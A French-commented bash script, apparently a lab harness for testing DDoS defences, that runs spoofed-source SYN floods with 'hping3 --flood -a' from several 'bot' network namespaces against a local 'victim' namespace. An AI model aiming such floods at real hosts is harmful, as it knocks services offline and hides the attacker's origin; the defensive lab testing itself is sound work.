#!/bin/bash

# Paramètres
VICTIM_NS="victim"
VICTIM_IP="10.0.0.1"
BOT_COUNT=3
BASE_BOT_NS="bot"
TARGET_PORT=80
LOG_DIR="./logs"
TEST_DURATION=30  # Durée en secondes pour chaque test

# Couleurs
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
RED='\033[0;31m'
NC='\033[0m'

# Créer un dossier pour les logs
mkdir -p "$LOG_DIR"

# Nettoyage complet (fin du script ou interruption)
cleanup() {
    echo -e "${YELLOW}[*] Nettoyage final...${NC}"
    for pid in "${PIDS[@]}"; do
        kill "$pid" 2>/dev/null
    done
    exit 0
}
trap cleanup SIGINT SIGTERM

# Fonction pour arrêter les attaques entre les tests sans quitter le script
stop_attack() {
    echo -e "${YELLOW}[*] Arrêt de l'attaque en cours...${NC}"
    for pid in "${PIDS[@]}"; do
        kill "$pid" 2>/dev/null
    done
    PIDS=()
}

# Vérification des dépendances
for cmd in ip hping3; do
    if ! command -v "$cmd" &>/dev/null; then
        echo -e "${RED}[!] Erreur : $cmd est requis.${NC}"
        exit 1
    fi
done

# === Test 5 : Multi-source (IP spoofing) ===

# POUR VERIFIER PAQUETS : DANS TERMINAL : sudo ip netns exec victim tcpdump -i veth-victim src net 192.168.0.0/16

#On spoof l'adresse source : la victime ne peut pas répondre.
# IP source = pas de réponses.
#Comme hping3 ne montre que les réponses, tu n’as aucun retour.
#C’est prévu par le design même du test.
#A regarder avec programme python et maps xdp

echo -e "${YELLOW}[5/5] Test : Multi-source avec IP spoofing${NC}"
PIDS=()
for i in $(seq 1 $BOT_COUNT); do
    NS="${BASE_BOT_NS}${i}"
    SPOOFED_SRC="192.168.$i.$((RANDOM%254+1))"
    echo -e "${GREEN}[*] Bot $NS spoofe IP source $SPOOFED_SRC${NC}"
    ip netns exec "$NS" hping3 -S --flood -a "$SPOOFED_SRC" -p "$TARGET_PORT" "$VICTIM_IP" > "$LOG_DIR/spoofed_${NS}.log" 2>&1 &
    PIDS+=($!)
done
sleep "$TEST_DURATION"
stop_attack

echo -e "${GREEN}[✓] Test 5 terminé."
